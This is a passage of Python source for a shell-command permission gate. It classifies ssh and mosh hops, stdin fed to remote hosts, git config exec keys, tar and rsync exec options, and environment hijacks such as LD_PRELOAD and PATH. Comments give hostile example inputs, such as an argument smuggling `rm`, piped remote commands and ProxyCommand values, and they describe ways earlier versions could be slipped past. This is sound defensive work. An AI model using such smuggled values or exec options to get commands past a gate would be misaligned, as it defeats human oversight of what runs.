                # had: a name an expansion made a store of reads the same in either spelling (_fold_made). A copy
                # with no parts and no post, as #320's.
                c.parts = [*c.parts, replace(prior_action, target=dest, parts=[], text="", title="", text_file="", own_signals=[
                    s for s in (prior_action.signals if prior_action.own_signals is None else prior_action.own_signals) if s != "unseen_body"])]
        else:
            c = _make("shell", summary=f"ssh {dest}", command=cmd)
        # An ssh that passes a stdin on gives its remote command that stdin, and an ssh there that runs it runs it
        # on the next host (#316). Only a line read as fed carries the signal. That reading finds the hop alone:
        # ssh's own part reads the command as before, so a wrapper around ssh still marks it.
        hop = forwards and bool(inner) and depth < _DEPTH and \
            _LINE_STDIN in _classify_fed(inner, inner_depth, True).signals
        fed = []
        reads = prog == "ssh" and _ssh_stdin_runs(words, k, piped, i, flags, fed_line)
        if reads:
            # #240: the login shell on the host runs ssh's stdin. It is read as shell, as for `bash -s`, and asks.
            fed = [_runs_stdin(_opaque(f"ssh {dest} runs its stdin as commands on the remote host"[:120], cmd), k)]
        elif hop:
            # #316: ssh passes its stdin on to the remote command, and an ssh in it runs it on the next host.
            fed = [_runs_stdin(_opaque(f"ssh {dest} passes its stdin to an ssh that runs it as commands"[:120], cmd), k)]
        # Where the line gives ssh a stdin itself, #240 built the parts that run it into ssh's own part, and the
        # part that led took the host as its target. One of them could lead while ssh's own part was still private
        # (`echo 'gh pr merge 1' | ssh $H x`).
        stdin, direct, lead = None, reads and _stdin_given(k, piped, unread=False), False
        if fed:
            if fed_line:
                fed[0].signals.append(_LINE_STDIN)
            if depth < _DEPTH:
                fed += _once(ctx, (classify_shell, inner_depth), k, piped, lambda t: [classify_shell(t, inner_depth)])
            lead = direct and _lead([c, *fed]) is not c
            # A part beside ssh's own, not built into it (#316): sudo or a privileged wrapper around ssh still marks
            # ssh's own part costly, as when ssh reads no stdin, and the line takes the more severe part.
            stdin = _combine(fed, cmd)
        dests = [host, dest]
        if dest != old_dest:
            # The gate used to read another word as the host. The line asks and both readings' parts are
            # matched, so a line the old reading asked about or denied is not allowed now.
            moved = moved or f"{dest or 'no host'}: the gate used to read {old_dest or 'no word'} as the host"
            dests += [_ssh_host(old_dest), old_dest]
        elif old_inner != inner:
            # mosh took words after the host as its options or their values (`mosh host ls --port 'x; rm ..'`).
            # With POSIXLY_CORRECT set, Getopt::Long stops at the host and mosh runs them as the command, so
            # the old reading's parts are matched too and the line asks.
            moved = moved or f"{dest}: words after the host run as the command when POSIXLY_CORRECT is set"
        if old_inner and old_inner != inner and depth < _DEPTH:
            c = _combine([c, classify_shell(old_inner, inner_depth)], cmd)
        if moved:
            c = _combine([_opaque(f"{prog} {moved}", cmd), c], cmd)
        local = []
        for name, val in runs:                # mosh --ssh, --client, --server: a command it runs; it asks
            run = classify_shell(val, inner_depth) if val and depth < _DEPTH else _make("shell", command=cmd)
            if name == "server" and not here:  # the server helper runs on the remote host, like the inner command
                c = _combine([_opaque(f"mosh --{name}: runs a command", cmd), run, c], cmd)
            else:                             # the ssh and client helpers run here, and with --local the server
                local.append(_combine([_opaque(f"mosh --{name}: runs a command", cmd), run], cmd))
        # The hop is a part too, so a `target:<host>` entry matches when the inner command has its own target:
        # the bare host, and the destination as written when it carries a user, a scheme or a port.
        c.parts += [_make("shell", summary=f"ssh {dest}", target=t, command=cmd, signals=["remote host"])
                    for t in dict.fromkeys(dests) if t]
        c = copy.deepcopy(c)                  # parts can be shared with a stored result (_own_copy): mark a copy
        for p in _each_part(c) if not here else ():   # every part runs on the remote host (D-075)
            if EXPOSURE.index(p.exposure) < 1:
                p.exposure = "internal"
        _hop_fill(c, dest)
        if local:                             # local helpers keep their own exposure
            c = _combine(local + [c], cmd)
            # A helper names the host as when it led the line, also where the remote line's store write leads (#461)
            c.parts += [_bare_copy(h, target=dest) for h in local if h is not c and not h.target]
        if not lead:                          # ssh's own part names the host, as when it led before #316
            c.target = dest if "unread hops" in c.signals else (c.target or dest)
        # #399: the host stands for an empty other target too, as for an empty target, so a rule on it sees each.
        # The copy of the action on it among the parts gets the host as well: a deny, reserved or rule entry on the
        # host's category sees it also when another part of the line outranks this one. Where the remote command's
        # own part takes the target (#493), the hop's host stays among the other targets, so a rule on the host
        # reaches the line as a deny or reserved entry reaches the hop's part (D-075), and a scope or a standing
        # grant keyed on a local path cannot cover the hop through the remote path alone.
        c.alt_targets = [t for t in dict.fromkeys([t or dest for t in c.alt_targets] + [host, dest])
                         if t != c.target]
        c.parts = [replace(p, target=dest) if p.alt_copy and not p.target else p for p in c.parts]
        if c.displaced is not None:           # #454: the part a sudo write displaced gets the host, as it did
            q = c.displaced                   # and so do its other targets and their copies (#399)
            _displace_with(c, target=q.target or dest,
                           alt_targets=[t for t in dict.fromkeys(t or dest for t in q.alt_targets)
                                        if t != (q.target or dest)],
                           parts=[replace(p, target=dest) if p.alt_copy and not p.target else p for p in q.parts])
        if not here:
            c.signals.append("remote host")
        if stdin is None:
            return [c]
        stdin = copy.deepcopy(stdin)          # as for c: the stdin runs on the remote host (ssh, never mosh)
        for p in _each_part(stdin):
            if EXPOSURE.index(p.exposure) < 1:
                p.exposure = "internal"
        if lead:
            stdin.target = dest if "unread hops" in c.signals else (stdin.target or dest)
        elif not direct:                      # the part #316 adds names the host
            stdin.target = stdin.target or dest
        if lead or not direct:
            # #399, as for c above: where this part names the host for an empty target, it names it for an empty
            # other target too, and so does the copy of its action there (`echo 'gh pr comment -wR o/r -b hi' | ssh
            # h`). After a hop that is the first host, where the line hands the stdin over, as for the target.
            stdin.alt_targets = [t for t in dict.fromkeys(t or dest for t in stdin.alt_targets) if t != stdin.target]
            stdin.parts = [replace(p, target=dest) if p.alt_copy and not p.target else p for p in stdin.parts]
            _hop_fill(stdin, dest)
        else:                                 # the remote line leads, as a store write (#461) where its read did not
            _hop_fill(stdin, dest, whole=True)
        stdin.signals.append("remote host")
        # The line keeps the first of equal parts. Both parts now run on the remote host, so they can be equal where
        # the part that runs the stdin led before: it comes first then, and the line is decided as before.
        return [stdin, c] if lead and _severity(stdin) == _severity(c) else [c, stdin]
    if prog in ("vercel", "netlify"):
        if "login" in argv:
            return [_make("credentials", summary=f"{prog} login", command=cmd)]
        if "--prod" in argv or "--production" in argv or sub in ("promote", "alias"):
            return [_make("deploy_production", summary=f"{prog} production deploy", command=cmd)]
        if sub in ("", "deploy") or sub.startswith("-"):
            return [_make("deploy_preview", summary=f"{prog} preview deploy", command=cmd)]
        if sub in ("remove", "rm"):
            return [_make("delete", exposure="public", summary=f"{prog} remove", command=cmd)]
        return [_make("shell", summary=f"{prog} {sub}", command=cmd)]
    if prog == "stripe":
        joined = " ".join(argv[1:]).lower()
        if re.search(r"\b(create|confirm|capture|pay)\b", joined) and re.search(
                r"(charge|payment|payout|transfer|invoice|refund|subscription|checkout)", joined):
            amt = _opt(argv, "--amount", "-d")
            try:
                cost = float(re.sub(r"[^\d.]", "", amt.split("=")[-1])) if amt else None
            except ValueError:
                cost = None
            return [_make("payment", summary="Stripe payment", cost=cost, command=cmd)]
        return [_make("read", summary=f"stripe {sub}", command=cmd)]
    if prog in ("psql", "mysql", "sqlite3", "duckdb") and _SQL_DESTRUCTIVE.search(" ".join(argv[1:])):
        return [_make("delete", summary=f"destructive SQL via {prog}", command=cmd)]
    if prog == "rsync" and _has(argv, "--delete", "--delete-after", "--delete-before", "--remove-source-files"):
        return [_make("delete", summary="rsync with delete", command=cmd)]
    if prog == "mv" and len(argv) > 2 and argv[-1] in ("/dev/null",):
        return [_make("delete", summary="move to /dev/null", command=cmd)]
    if prog in ("chmod", "chown", "chflags"):
        if any(".ssh" in a or a.endswith((".pem", ".key")) for a in argv):
            return [_make("credentials", summary=f"{prog} on key material", command=cmd)]
        return [_make("shell", summary=prog, command=cmd)]
    if prog == "crontab":
        if _has(argv, "-l"):
            return [_make("read", summary="crontab -l", command=cmd)]
        return [_opaque("crontab changes scheduled jobs", cmd)]
    if (prog, sub) in SUBCOMMANDS:
        return [_make(SUBCOMMANDS[(prog, sub)], summary=f"{prog} {sub}", command=cmd)]
    if prog in PROGRAMS:
        cat = PROGRAMS[prog]
        target = next((a for a in reversed(argv[1:]) if not a.startswith("-")), "")
        c = _make(cat, summary=f"{prog} {target}".strip() if cat == "delete" else prog,
                  target=target if cat == "delete" else "", link=target if cat == "delete" else "", command=cmd)
        if prog == "rm" and _has(argv, "-r", "-R", "--recursive") and _has(argv, "-f", "--force"):
            c.signals.append("recursive force delete")
        return [c]
    if (prog, sub) in _RUN_WRAPPERS:
        i = 2
        while i < len(words) and words[i].text.startswith("-"):
            f = words[i].text
            i += 1
            if f == "--":
                break
            if f in _WRAPPER_VALUE_OPTS and "=" not in f:
                i += 1
        return inner_words(words[i:]) or [_make("shell", summary=f"{prog} run", command=cmd)]
    if prog in TOOL_SUBCOMMANDS:
        if prog == "uv" and sub == "tool" and argv[2:3] == ["run"]:
            return [_opaque("uv tool run downloads and runs a tool", cmd)]
        if (sub or "_") in TOOL_SUBCOMMANDS[prog] or (prog == "yarn" and not sub):
            return [_make("shell", summary=f"{prog} {sub}".strip(), command=cmd)]
        return [_opaque(f"{prog} {sub} runs project scripts or code the gate cannot see".strip(), cmd)]
    if prog == "hash" and (rebind := _hash_rebind(words)):     # `hash -p` rebinds a name to another file (#330)
        return [_opaque(rebind[0], cmd, target=rebind[1], rebinds=True)]
    if prog in READ_PROGRAMS:
        return [_make("read", summary=prog, command=cmd)]
    if prog in SHELL_PROGRAMS:
        return [_make("shell", summary=" ".join(argv[:3])[:80], command=cmd)]
    return [_opaque(f"runs {prog}, a program the gate does not know", cmd, signal="unknown program")]


def _option_values(argv: list[str], names: tuple, start: int = 1, takes: str = "", longs: tuple = (),
                   operands: int | None = None, least: int = 3, wild: frozenset = frozenset(),
                   rest: list[int] | None = None, pflag: bool = False) -> list[str]:
    """The values given to the options `names` in argv[start:], read as getopt reads them (#154). In a short
    option cluster the first letter that takes a value (one of `names`, or a letter in `takes`) ends the word:
    its value is the rest of the word or the next word (`-xIzstd`, `-avze ssh`, `-oProxyCommand=cmd`). A long
    option takes `=value`, or the next word when it is in `longs`, is one of `names` or abbreviates one in
    `least` characters or more (`--to-com cmd`). A name of more than one letter after one dash (`-TT`, `-cmd`)
    is a whole word. Options end at `--`, and with `operands` at the operand after that many: ssh reads options
    before and after its destination, and the remote command follows. An operand at an index in `wild` may
    expand to no word or several (`$A`, `"$@"`, a glob), so the operands cannot be counted and every word is
    read. With ``rest`` the index of each operand is added to it, every word after `--` too (#399). With ``pflag``
    a short option's value in the same word drops one `=` before it, as Go's pflag reads it: `-R=x`, `-wR=x`."""
    shorts = "".join(n[1] for n in names if len(n) == 2)
    whole = [n for n in names if len(n) > 2 and not n.startswith("--")]
    long_names = [n for n in names if n.startswith("--")]
    out: list[str] = []
    i, seen = start, 0
    while i < len(argv):
        a = argv[i]
        i += 1
        key, eq, val = a.partition("=")
        if a == "--":
            if rest is not None:
                rest.extend(range(i, len(argv)))
            break
        if key in whole:
            if eq or i < len(argv):
                out.append(val if eq else argv[i])
                i += 0 if eq else 1
        elif a.startswith("--"):
            hit = any(n == key or (len(key) >= least and n.startswith(key)) for n in long_names)
            if eq and hit:
                out.append(val)
            elif not eq and (hit or key in longs) and i < len(argv):
                if hit:
                    out.append(argv[i])
                i += 1
        elif a == "-" or not a.startswith("-"):
            if i - 1 in wild:
                operands = None
            if operands is not None:
                if seen >= operands:
                    break
                seen += 1
            if rest is not None:
                rest.append(i - 1)
        else:
            for j, ch in enumerate(a[1:], 2):
                if ch in shorts or ch in takes:
                    value = a[j:]
                    if pflag and value[:1] == "=" and len(value) > 1:
                        value = value[1:]
                    if not value and i < len(argv):
                        value, i = argv[i], i + 1
                    if ch in shorts:
                        out.append(value)
                    break
    return out


def _ssh_options(args: list[str], i: int, after: bool = False) -> tuple[int, str]:
    """Where ssh's options from args[i] end, and the letters of its flags among them. Short options cluster as in
    getopt: the first letter that takes a value ends the word, and the value is the rest of it or the next word
    (`-vp 22`, `-oPort=22`, `-B eth0`). Before the host a word starting with `--` is passed over, as the gate has
    read it since D-075. After the host (`after`) ssh reads options again, up to its remote command, and `--`
    ends them."""
    letters = ""
    while i < len(args) and args[i].startswith("-") and not (after and args[i] == "-"):
        w = args[i]
        i += 1
        if w.startswith("--"):
            if after and w == "--":
                break
            continue
        v = next((j for j, ch in enumerate(w[1:], 1) if ch in _SSH_VALUE_OPTS), 0)
        letters += w[1:v or None]
        if v and v == len(w) - 1:
            i += 1
    return i, letters


def _stdin_given(k: _Cmd, piped: str | None, unread: bool = True) -> bool:
    """Whether the line gives the command a stdin: a pipe in, a heredoc or here-string, a `<` from anything but
    /dev/null, or, with `unread`, a compound or wrapper around it fed a stdin whose text the gate cannot read
    (k.stdin_unknown, #316)."""
    return bool(k.piped_in or piped is not None or k.heredocs or k.herestrings or (unread and k.stdin_unknown)
                or any(op in _READ_REDIRS and not (op == "<" and t.text == "/dev/null") for op, t in k.redirs))


def _ssh_stdin_runs(words: list, k: _Cmd, piped: str | None, i: int, flags: str, fed: bool = False) -> bool:
    """Whether the login shell on the remote host runs ssh's stdin as commands (#240). That takes a stdin the line
    gives ssh (a pipe, a heredoc, a here-string, a `<` from anything but /dev/null, or a feed the gate cannot
    read, #316), none of `-n`, `-N` and `-f` (ssh then does not read it) and no remote command: ssh reads
    options after the host too (`ssh host -T`), up to the command, and an empty word is no command. A word
    that may expand to no word or several (`$A`, a glob) among the options and the host, or as every word of
    the command, leaves them uncountable, so the stdin is read then too, unless a `-n`, `-N` or `-f` comes
    before that word (#316: `ssh -n "$h" uptime`). `words` is ssh's argv as words; `i` is the host's index in
    words[1:], `flags` the letters before it. `fed`: ssh's stdin is that of a line fed one the gate cannot read
    (a >( ) body, a hop's remote command, #316)."""
    if not (fed or _stdin_given(k, piped)):
        return False
    sure, j, wild = _ssh_sure_flags(words, i, flags)
    if set(sure) & set("nNf"):
        return False
    texts = [w.text for w in words[1:]]
    return any(wild[:j]) or " ".join(texts[j:]) == "" or all(wild[j:])


def _ssh_sure_flags(words: list, i: int, flags: str) -> tuple[str, int, list[bool]]:
    """(ssh's flag letters the gate is sure of, where its options after the host end, which of its words may expand
    to no word or several). Such a word among the options and the host may end the options early or move later
    ones into the remote command, so only the letters before it are sure: `-n` is an option in `ssh -n "$h"
    uptime`, not in `ssh $OPTS -n host`. A `--` ends ssh's options, so no letter after it is sure: `-n` is the host in
    `ssh -- -n "$h"`. `i` is the host's index in words[1:], `flags` the letters before it."""
    texts = [w.text for w in words[1:]]
    wild = [w.dynamic or (not w.quoted and (w.glob or bool(re.search(r"\{[^}]*(,|\.\.)[^}]*\}", w.text))))
            for w in words[1:]]
    j = i + 1 if "--" in texts[:i] else _ssh_options(texts, i + 1, after=True)[0]
    first = next((n for n, x in enumerate(wild[:j]) if x), j)
    if first > i:
        return flags + _ssh_options(texts[:first], i + 1, after=True)[1], j, wild
    sure = texts[:first]
    return _ssh_options(sure[:sure.index("--")] if "--" in sure else sure, 0)[1], j, wild


def _ssh_forwards(words: list, k: _Cmd, piped: str | None, i: int, flags: str, fed: bool = False) -> bool:
    """Whether ssh passes a stdin of its line on to the remote host (#316): the line gives it one, as for
    _ssh_stdin_runs, and none of `-n`, `-N` and `-f`, before the host or after it, keeps ssh from reading it. Its
    remote command is then a line fed that stdin, and an ssh in it with no stdin of its own runs it on the next
    host. A remote `bash` there already asks."""
    if not (fed or _stdin_given(k, piped)):
        return False
    texts = [w.text for w in words[1:]]
    late = "" if "--" in texts[:i] else _ssh_options(texts, i + 1, after=True)[1]
    return not set(flags + late) & set("nNf")


def _ssh_setting(text: str) -> tuple[str, str]:
    """An ssh `-o` setting split as ssh's readconf splits it: (keyword in lower case, the command value). Leading
    whitespace is skipped; the keyword may be quoted and ends at whitespace, a quote or `=`; a command value is
    the rest of the line after whitespace and `=` (`ProxyCommand = cmd`, `"ProxyCommand" cmd`, `proxycommand=cmd`)."""
    s = text.lstrip(" \t\r\n=")
    m = re.search(r"[ \t\r\n\"=]", s)
    if not m:
        return s.lower(), ""
    j = m.start()
    if s[j] == '"':                                  # the quote is dropped and the keyword runs to the next one
        s = s[:j] + s[j + 1:]
        k = s.find('"', j)
        if k < 0:
            return "", ""                            # ssh rejects an unclosed quote
        key, rest = s[:k], s[k + 1:]
    else:
        key, rest = s[:j], s[j:]
    return key.lower(), rest.lstrip(" \t\r\n=")


def _builtin_options(args: list, plus: bool) -> tuple[int, str]:
    """Where a builtin's operands start in ``args`` (its words after the name), and the option letters bash surely
    reads before them. `--` ends the options, and so does a word not spelled `-x`, or `+x` when ``plus`` (declare,
    typeset and local take `+x`; export, readonly and unset read it as a name). So does a word that may expand
    (`-$f`, `-[fv]`, `-{,}`): bash may read it as options, as `-`, which ends them, or as several words, so it and
    the words after it are operands, and its letters count for nothing (#329)."""
    i, flags = 0, ""
    while i < len(args) and args[i].text[:1] in ("-+" if plus else "-") and len(args[i].text) > 1 \
            and not (args[i].dynamic or args[i].glob or args[i].brace):
        if args[i].text == "--":
            return i + 1, flags
        flags += args[i].text[1:] if args[i].text[0] == "-" else ""
        i += 1
    return i, flags


def _filled_words(prog: str, args: list) -> list:
    """The name words `read` (also `-a`, which names an array) and `printf -v` fill, which hold a value the
    gate does not see (#579)."""
    if prog == "read":
        targets, i = [], 0
        while i < len(args) and args[i].text.startswith("-") and args[i].text != "-":
            t, i = args[i].text, i + 1
            if t == "--":
                break
            for j, ch in enumerate(t[1:], 1):
                if ch in "adinNptu":                 # the options that take a value; -a names an array
                    val = _Word(text=t[j + 1:], dynamic=args[i - 1].dynamic) if t[j + 1:] else \
                        (args[i] if i < len(args) else None)
                    i += 0 if t[j + 1:] else 1
                    if ch == "a" and val is not None:
                        targets.append(val)
                    break
        return targets + args[i:]
    if prog == "printf" and args[:1] and args[0].text.startswith("-v"):
        return [_Word(text=args[0].text[2:], dynamic=args[0].dynamic)] if args[0].text != "-v" else args[1:2]
    return []


def _indirect_sets(prog: str, words: list, cmd: str) -> list[Classification]:
    """Variables a builtin sets to a value the gate does not see: the names `read` (also `-a`) and
    `printf -v` fill, the target of a nameref (`declare -n r=PATH`), and an exporter argument whose name
    comes from a variable (`export $X=...`). A variable _env_hazard lists is opaque, named, and so is a
    name, or an exporter option word, the gate cannot read. A for-loop variable comes here from
    _classify_simple with prog "for"."""
    args, targets, parts = words[1:], [], []
    if prog == "for":
        targets = args[:1]
    elif prog in _EXPORTERS:
        i, flags = _builtin_options(args, prog in ("declare", "typeset", "local"))
        if "f" in flags or "F" in flags:                  # names functions, not variables
            return []
        if "p" in flags and prog in ("declare", "typeset", "local"):  # prints; export/readonly -p still assign
            return []
        for w in args[i:]:
            name, (_, sep, ref) = re.split(r"\[|\+?=", w.text, maxsplit=1)[0], w.text.partition("=")
            if _unreadable_name(w):
                targets.append(w)
            elif w.dynamic and w.text.startswith(("-", "+")):  # `-o=$v`: options and names the gate cannot see
                parts.append(_opaque(f"{prog} takes a word the gate cannot read", cmd))
            elif "n" in flags and prog != "export":     # a nameref: what it points at is what gets set
                if not sep:
                    parts.append(_opaque(f"{prog} -n {name} makes a reference the gate cannot follow"[:120], cmd))
                else:
                    targets.append(_Word(text=ref, dynamic=w.dynamic))
    else:
        targets = _filled_words(prog, args)
    for w in targets:
        name = re.split(r"\[|\+?=", w.text, maxsplit=1)[0]
        if _unreadable_name(w):
            parts.append(_opaque(f"{prog} sets a variable whose name the gate cannot read", cmd))
        elif why := _env_hazard(name):
            parts.append(_opaque(f"{name} {why} (set by {prog})", cmd, rebinds=name in _REBIND_VARS))
        parts += [_opaque(f"{n} {why} (set in a subscript)", cmd, rebinds=n in _REBIND_VARS)  # `read 'a[PATH=1]'`
                  for n in _subscript_sets(w.text) if (why := _env_hazard(n))]
    return parts


def _exec_options(before: list, words: list, k: _Cmd, cmd: str, depth: int, ctx: dict,
                  piped: str | None) -> list[Classification]:
    """Commands a trusted program is told to run (#154): an exec option (`tar --to-command`, `rsync -e`,
    `man -P`, `git rebase -x`...), an ssh `-o ProxyCommand`, a sqlite3/psql shell command, or an environment variable
    such as GIT_SSH_COMMAND set before the program. Each is classified as a nested command; a value the
    gate cannot read (a script file, `.output FILE`) is opaque, and so is a variable that loads code or
    moves where programs and config are found (LD_PRELOAD, PATH...). Git config set on the line (`git -c`,
    `git --config-env`, `git clone --config`, GIT_CONFIG_*) takes _git_config_kind. `words` is empty for a
    bare assignment."""
    if words and words[0].dynamic:
        return []
    prog, argv = (words[0].text.rsplit("/", 1)[-1] if words else ""), [w.text for w in words]
    parts: list[Classification] = []

    def nested(text: str, what: str) -> Classification | None:
        text = text.strip()
        if not text:
            return None
        if depth >= _DEPTH:
            c = _too_deep(cmd)
        else:
            c = classify_shell(text, depth + 1)
            c.summary = f"{what} {'' if c.summary.startswith('runs ') else 'runs '}{c.summary}"[:120]
        parts.append(c)
        return c

    takes, longs = _VALUE_OPTS.get(prog, ("", ()))
    if prog in ("sqlite3", "duckdb"):                # `--cmd` is `-cmd`
        argv = [a[1:] if a.startswith("--") and len(a) > 2 else a for a in argv]
    if prog == "tar" and argv[1:2] and argv[1][:1] not in ("", "-"):
        # old style (`tar xIf zstd a.tar`): each letter is an option, and each one that takes a value takes
        # the next word in turn
        opts, vals = [], argv[2:]
        for ch in argv[1]:
            opts.append("-" + ch)
            if ch in takes and vals:
                opts.append(vals.pop(0))
        argv = [argv[0], *opts, *vals]

    # words that may expand to no word or several: ssh's destination and remote command cannot be counted past one
    wild = frozenset(i for i, w in enumerate(words) if w.dynamic or (not w.quoted and (
        w.glob or re.search(r"\{[^}]*(,|\.\.)[^}]*\}", w.text))))

    def values(names: tuple, least: int = 3, start: int = 1, sub_takes: str | None = None) -> list[str]:
        return _option_values(argv, names, start, takes if sub_takes is None else sub_takes, longs,
                              1 if prog == "ssh" else None, least, wild)

    def git_config(pairs: list[str], what: str) -> None:
        # KEY=VALUE pairs checked as `git -c` is: an exec key or a `!` value is opaque, and the value is read
        # as the command it is, so a category deny on it fires; a key that loads a config file or a template
        # is opaque; a key from a variable is opaque.
        for kv in pairs:
            key, _, value = kv.partition("=")
            kind = _git_config_kind(key, value)
            if re.search(r"[$`]", key):
                parts.append(_opaque(f"{what} sets a git config key the gate cannot read", cmd))
            elif kind == "exec":
                parts.append(_opaque(f"{what} sets {key}, which makes git run a command"[:120], cmd))
                nested(value.removeprefix("!"), f"{what} {key}")
            elif kind:
                parts.append(_opaque(f"{what} sets {key}, which {_GIT_CONFIG_DOES[kind]}"[:120], cmd))

    # assignments before the program (`GIT_SSH_COMMAND=x git ...`, also through env, sudo or timeout; one whose name
    # is quoted is left in `words` and read here too, #471), export's arguments, a bare assignment the rest of the
    # line inherits, and the ones hidden in an expansion, arithmetic or a redirection (`${PATH:=.}`, `$((PATH=10))`,
    # `{PATH}>f`); never an argument that merely looks like one (`grep EDITOR=x`). Only a real program position runs
    # a value.
    n = len(before) - len(words)
    while n < len(before) and _ASSIGN.fullmatch(before[n].text):
        n += 1

    def split_assign(a: str) -> tuple[str, str]:
        # NAME+=v appends: for a listed variable that is the value $NAME then v (`PATH+=:/usr/bin` is
        # `$PATH:/usr/bin`); a command-valued one keeps v, the command text it adds
        name, value = re.split(r"\+?=|\[", a, maxsplit=1)[0], a.partition("=")[2]
        appends = re.match(r"[A-Za-z_]\w*\+=", a) and name not in _EXEC_ENV
        return name, f"${{{name}}}{value}" if appends else value

    assign_words = [w for w in before[:n] if _ASSIGN.fullmatch(w.text)]
    assigns = [w.text for w in assign_words]
    # pytest, or python -m pytest, before which PYTHONPATH adds nothing: the runner imports conftest.py and the
    # tests, project code the gate already lets it run (D-038 "Not done")
    runner = prog in ("pytest", "py.test") or bool(re.fullmatch(r"python[\d.]*", prog)) and argv[1:3] == ["-m", "pytest"]
    sets: list[tuple[str, str | None, bool, bool]] = [(*split_assign(w.text), not words, _kept_text(w.raw))
                                                      for w in assign_words]
    if prog in _EXPORTERS:
        sets += [(*split_assign(w.text), True, _kept_text(w.raw)) for w in words[1:] if _ASSIGN.fullmatch(w.text)]
    named = assigns + (argv[1:] if prog in (*_EXPORTERS, "unset") else []) + \
        [b for a, b in zip(argv, argv[1:]) if prog in ("test", "[") and a == "-v"]   # where NAME[..] is arithmetic
    sets += [(name, value, True, literal) for name, value, literal in _hidden_sets(k, named)]
    if prog == "unset":
        # `unset PATH` is `PATH=` for what follows it: with no PATH, bash looks a command up in the
        # working folder, the empty-element hazard #231 reads in an assignment (#329). `-f` names
        # functions (with `-v` it is an error), so it leaves PATH alone, but only where bash surely
        # reads it as an option. A word that may expand, a name or an option, may spell PATH or hide
        # the options (`unset $v`, `unset {PATH,}`, `unset -${f}v PATH`), and so may a `$` outside
        # double quotes anywhere in a word: x='1] PATH [' splits `unset a[$x]` into three names. An
        # unquoted `[` that starts a word is a glob too, one the lexer does not mark (`unset [P]ATH`),
        # also after a `\<newline>` that bash drops first.
        i, flags = _builtin_options(words[1:], False)
        if "f" not in flags:
            sets += [("PATH", "", True, False) for a in argv[1 + i:] if re.split(r"\[", a)[0] == "PATH"]
            if any(_unreadable_name(w) or w.brace or w.raw.replace("\\\n", "")[:1] == "[" or
                   w.dynamic and not re.fullmatch(r'"(?:[^"\\]|\\.)*"', w.raw) for w in words[1:]):
                parts.append(_opaque("unset takes a word the gate cannot read, which may unset PATH", cmd))
    git_env: dict[tuple[str, ...], str] = {}
    for name, value, runs_nothing, literal in sets:
        if name in _EXEC_ENV:
            c = nested(_prompt_text(value or "") if name == "PS4" else (value or "").lstrip("|"), name)
            if c is not None and runs_nothing and c.category == "opaque_exec" and "unread nest" not in c.signals:
                parts.pop()                              # export runs nothing; an unknown value is not a hit
        elif name == "GIT_CONFIG_PARAMETERS":           # git's own format: 'key'='value' 'key2'='value2'
            try:
                git_config(shlex.split(value or ""), name)
            except ValueError:
                parts.append(_opaque(f"{name} sets git config the gate cannot read", cmd))
        elif m := _GIT_CONFIG_ENV.fullmatch(name):
            git_env[m.groups()] = value or ""
        elif name == "PYTHONPATH" and not runs_nothing and runner:
            pass                                         # a test runner already runs the project's code
        elif why := _env_hazard(name, value, literal):   # _EXEC_ENV_OPAQUE, and LESS with a `+` command
            parts.append(_opaque(f"{name} {why}", cmd, rebinds=name in _REBIND_VARS))
    parts += _indirect_sets(prog, words, cmd)
    for (kind, num), value in git_env.items():
        if kind == "KEY":
            git_config([f"{value}={git_env.get(('VALUE', num), '')}"], f"GIT_CONFIG_KEY_{num}")
        elif ("KEY", num) not in git_env:
            parts.append(_opaque(f"GIT_CONFIG_VALUE_{num} sets git config whose key is not on the line", cmd))
    for v in values(_EXEC_OPTS.get(prog, ())):
        nested(v, f"{prog} option")
    for v in values(_EXEC_FILE_OPTS.get(prog, ())):
        parts.append(_opaque(f"{prog} runs the script {v}"[:120], cmd))
    if prog == "tar":
        # any abbreviation longer than `--checkpoint`, which takes an optional value of its own
        for v in values(("--checkpoint-action",), least=len("--checkpoint-")):
            if v.startswith("exec="):
                nested(v[5:], "tar --checkpoint-action")
    if prog == "git":
        config: list[str] = []
        i = _git_subcommand(argv, config)
        sub, rest = (argv[i] if i < len(argv) else ""), argv[i + 1:]
        sub_takes = _GIT_VALUE_OPTS.get(sub, "")
        git_config(config, "git -c")
        if sub == "clone":                               # clone's own config
            git_config(values(("--config", "-c"), start=i + 1, sub_takes=sub_takes), "git clone --config")
        if sub == "config":                              # a command value set for later is read now
            git_config(_git_config_sets(rest), "git config")
        if sub in ("clone", "init"):                     # a template whose hooks run
            for v in values(("--template",), start=i + 1, sub_takes=sub_takes):
                if v:
                    parts.append(_opaque(f"git {sub} runs the hooks in the template {v}"[:120], cmd))
        for v in values(_GIT_EXEC_OPTS.get(sub, ()), start=i + 1, sub_takes=sub_takes):
            nested(v, f"git {sub} option")
        if sub == "bisect" and rest[:1] == ["run"] and len(rest) > 1 and depth < _DEPTH:
            parts.append(_opaque("git bisect run runs a command per step", cmd))
            parts += _classify_simple(_wrapped(k, words[i + 2:]), cmd, depth + 1, ctx, piped)
        if sub == "submodule":
            j = 0
            while j < len(rest) and rest[j].startswith("-") and rest[j] != "--":
                j += 1                               # `git submodule -q foreach`, `--quiet`, `--cached`
            if rest[j:j + 1] == ["foreach"]:
                run = rest[j + 1:]
                while run and run[0].startswith("-"):
                    run = run[1:]                    # `foreach --recursive -q`
                nested(" ".join(run), "git submodule foreach")
    if prog in ("ssh", "scp", "sftp"):
        # `none` turns a command or library setting off (#232); a keyword the gate cannot read (`$OPT`, a glob, an
        # unclosed quote that an expansion may close) asks
        for v in values(("-o",)):
            key, value = _ssh_setting(v)
            if value.strip(" \t\r\n").lower() == "none" and (key in _SSH_EXEC_SETTINGS or key in _SSH_LIB_SETTINGS):
                continue
            if v.strip() and not key.isalnum():
                parts.append(_opaque(f"ssh -o {v} is a setting the gate cannot read"[:120], cmd))
            elif key in _SSH_EXEC_SETTINGS:
                c = nested(value, f"ssh {_SSH_EXEC_SETTINGS[key]}")
                if c is not None and key == "remotecommand":
                    # Every part runs on the remote host, as for the hop (D-075): a part the store write it makes
                    # leads now (#461) is still raised. Parts can be shared with a stored result, so a copy. A nested
                    # part keeps its private reading as a copy too, so an entry on `exposure: private` meets it as before.
                    c = parts[-1] = copy.deepcopy(c)
                    private = [_bare_copy(p) for p in list(_each_part(c))[1:] if EXPOSURE.index(p.exposure) < 1]
                    for p in _each_part(c):
                        p.exposure = max(p.exposure, "internal", key=EXPOSURE.index)
                    c.parts += private
                    _raise_axes(c, exposure="internal")
                    c.signals.append("remote host")
            elif key in _SSH_LIB_SETTINGS and value.strip().lower() != "internal":
                parts.append(_opaque(f"ssh {_SSH_LIB_SETTINGS[key]} loads a library", cmd))
    if prog == "ssh":
        for v in values(("-I",)):
